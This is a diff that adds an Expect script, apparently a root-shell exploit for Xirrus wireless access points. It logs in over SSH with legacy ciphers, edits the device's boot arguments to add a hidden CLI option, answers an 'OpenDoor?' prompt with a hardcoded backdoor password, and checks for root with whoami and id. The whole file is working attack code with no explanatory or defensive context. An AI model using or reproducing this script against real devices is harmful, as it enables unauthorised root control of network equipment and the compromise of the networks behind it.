@@ -1,0 +1,37 @@
+#!/usr/bin/expect -f
+
+if {[llength $argv] != 3} {
+    puts "Usage: ./xirrus_rootshell.exp <host> <username> <password>"
+    exit 1
+}
+
+set timeout 20
+set host [lindex $argv 0]
+set user [lindex $argv 1]
+set password [lindex $argv 2]
+
+spawn ssh -oHostKeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc,3des-cbc,aes192-cbc,aes256-cbc $user@$host
+
+expect "password:"
+send "$password\r"
+
+expect "#"
+send "configure\r"
+expect "(config)#"
+send "boot-env\r"
+expect "(config-boot)#"
+send "edit bootargs console=ttyS0,115200n8 root=/dev/ram rw quiet console=ttyS0,115200n8 root=/dev/ram rw quiet CLIOPTS=b\r"
+expect "(config-boot)#"
+send "save\r"
+expect "(config-boot)#"
+send "config\r"
+expect "(config)#"
+send "o\r"
+expect "OpenDoor?"
+send "pazzword\r"
+
+expect "#"
+
+send "whoami; id; uname -a\r"
+
+interact
